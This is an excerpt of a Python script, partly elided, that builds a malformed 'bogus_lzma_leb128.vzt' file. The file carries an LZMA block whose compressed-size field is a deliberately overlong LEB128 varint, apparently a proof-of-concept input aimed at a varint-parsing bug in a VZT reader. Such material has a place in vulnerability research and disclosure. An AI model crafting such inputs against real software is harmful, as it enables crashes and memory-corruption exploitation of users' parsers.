...
block_data += varint(1)                 # num_dict_entries
if len(block_data) % 4:
...
# custom LZMA wrapper
lzma_out = lzma.compress(block_data, lzma.FORMAT_ALONE, 0)
block_compr = b'z7'
block_compr += varint(max(len(block_data), len(lzma_out)))  # uncompressed size / blksiz
haxx = varint(len(lzma_out))
haxx = haxx[:-1] + (haxx[-1] & 0x7F).to_bytes(1) + b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80'
block_compr += haxx                                         # compressed size
block_compr += lzma_out
block_compr += varint(0)                # EOF
...
with open('bogus_lzma_leb128.vzt', 'wb') as f:
    f.write(output)
